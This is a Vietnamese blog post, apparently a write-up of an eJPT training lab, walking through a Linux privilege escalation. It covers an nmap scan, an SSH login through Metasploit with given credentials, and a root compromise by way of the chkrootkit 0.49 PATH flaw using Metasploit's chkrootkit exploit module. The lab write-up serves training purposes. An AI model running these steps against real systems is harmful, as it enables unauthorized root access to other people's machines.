---
title: Privilege Escalation - Rootkit Scanner
published: 2025-06-08
tags: [eJPT, Linux, Privilege Escalation]
category: 'Learning'
description: Privilege Escalation using Rootkit Scanner
draft: false 
---


# EJPT LAB: Privilege Escalation - Rootkit Scanner 
> Lỗ hổng trong `chkrootkit 0.49` là một lỗ hổng leo thang đặc quyền cục bộ (local privilege escalation) nghiêm trọng, xuất phát từ cách công cụ này thực thi một số lệnh hệ thống với quyền root mà không kiểm tra kỹ đường dẫn (PATH). Điều này cho phép kẻ tấn công – nếu đã có quyền truy cập như một người dùng thông thường – chèn mã độc vào thư mục như `/tmp`, sau đó chờ `chkrootkit` được chạy bởi cron hoặc dịch vụ khác. Khi đó, mã độc sẽ được thực thi với quyền root, từ đó cho phép kiểm soát toàn bộ hệ thống.
Lỗ hổng này đã được ghi nhận trong các hệ thống sử dụng `chkrootkit` phiên bản 0.49 trở về trước và là ví dụ điển hình cho việc chạy công cụ bảo mật với quyền cao có thể dẫn đến hậu quả nghiêm trọng nếu không được cấu hình an toàn.


## I. Truy cập vào máy Kali
Truy cập vào đường dẫn phòng lab đã được cung cấp để khởi động máy Kali.
![image](https://hackmd.io/_uploads/SyKVMkfmeg.png)

## II. Kiểm tra kết nối đến máy mục tiêu
Sử dụng lệnh `ping` để kiểm tra xem máy mục tiêu có đang hoạt động hay không:
```bash
ping -c 4 demo.ine.local
```
Lệnh này gửi 4 gói tin ICMP đến địa chỉ `demo.ine.local`. Nếu có phản hồi (reply), nghĩa là máy mục tiêu đang bật và có thể truy cập được – tiền đề để thực hiện các cuộc tấn công.
![image](https://hackmd.io/_uploads/B1MwGkfmxl.png)

## III. Quét cổng với Nmap
Ta sẽ quét các cổng đang mở để biết dịch vụ nào đang chạy trên máy mục tiêu:

```bash
nmap -sS -sV demo.ine.local
```
![image](https://hackmd.io/_uploads/rJE_zkzQll.png)


- `-sS`: Quét theo kiểu SYN (stealth scan), giúp quét nhanh và tránh bị hệ thống phát hiện do không hoàn tất bắt tay TCP.
- `-sV`: Phát hiện phiên bản dịch vụ đang chạy trên các cổng.

Thông tin này cực kỳ quan trọng trong giai đoạn **trinh sát (reconnaissance)** để xác định các điểm có thể khai thác.


## IV. Khai thác SSH với Metasploit

Sau khi biết được dịch vụ SSH đang mở, và có sẵn thông tin đăng nhập (`jackie:password`), ta sẽ sử dụng Metasploit – framework khai thác mạnh mẽ – để đăng nhập từ xa.

```bash
msfconsole
```
![image](https://hackmd.io/_uploads/HJT9fJzQeg.png)

Sau đó dùng mô-đun đăng nhập SSH:

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS demo.ine.local
set USERNAME jackie
set PASSWORD password
exploit
```

Nếu đăng nhập thành công, bạn đã **chiếm được quyền điều khiển máy mục tiêu với vai trò người dùng `jackie`**.
![image](https://hackmd.io/_uploads/H1CAM1fQxe.png)


## V. Tương tác với phiên shell

Khi phiên SSH đã được mở, bạn có thể tương tác trực tiếp với hệ thống:

```bash
sessions -i 1
```
![image](https://hackmd.io/_uploads/rJFyQyfQll.png)

Chạy:

```bash
ps aux
```
![image](https://hackmd.io/_uploads/rJOlQyMmex.png)

Lệnh này liệt kê toàn bộ các tiến trình đang chạy. Nếu thấy các dịch vụ hệ thống như `cron`, hoặc script lạ chạy định kỳ, có thể đó là điểm bắt đầu để thực hiện **leo thang đặc quyền (privilege escalation)**.

## VI. Phân tích script đáng ngờ

Ta thấy một bash script đang chạy có tên `/bin/check-down`. Kiểm tra nội dung nó:

```bash
cat /bin/check-down
```
![image](https://hackmd.io/_uploads/SkKWXkfXgg.png)

Script này đang chạy công cụ `chkrootkit` mỗi 60 giây. Đây là một công cụ quét rootkit phổ biến, nhưng **phiên bản cũ (0.49)** của nó có lỗ hổng bảo mật nghiêm trọng.

Xác định phiên bản và vị trí thực thi:

```bash
command -v chkrootkit
/bin/chkrootkit -V
```
![image](https://hackmd.io/_uploads/HJpGmJfmxl.png)

## VII. Khai thác leo thang đặc quyền với chkrootkit

Ta tra cứu với `searchsploit` để tìm khai thác cho chkrootkit:

```bash
searchsploit chkrootkit 0.49
```
![image](https://hackmd.io/_uploads/BkvmQJfQll.png)

Kết quả cho thấy có tồn tại **lỗ hổng leo thang đặc quyền (local privilege escalation)** trong phiên bản này. Lý do là `chkrootkit` chạy với quyền root và thực thi các file từ đường dẫn không an toàn (như `/tmp`), dẫn đến có thể chèn mã độc để chiếm quyền root.


## Tấn công và đọc flag

**Quan trọng:** Không đóng phiên shell đang tương tác. Dùng `CTRL+Z` để gửi về nền.

Sử dụng mô-đun Metasploit:

```bash
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set session 1
set LHOST 192.60.22.2
exploit
```

Khi khai thác thành công, bạn đã trở thành người dùng `root` trên máy mục tiêu – mức cao nhất. Bây giờ bạn có thể truy cập mọi file, ví dụ như đọc cờ (flag):

```bash
cat /root/flag
```
![image](https://hackmd.io/_uploads/BJAHQkz7le.png)

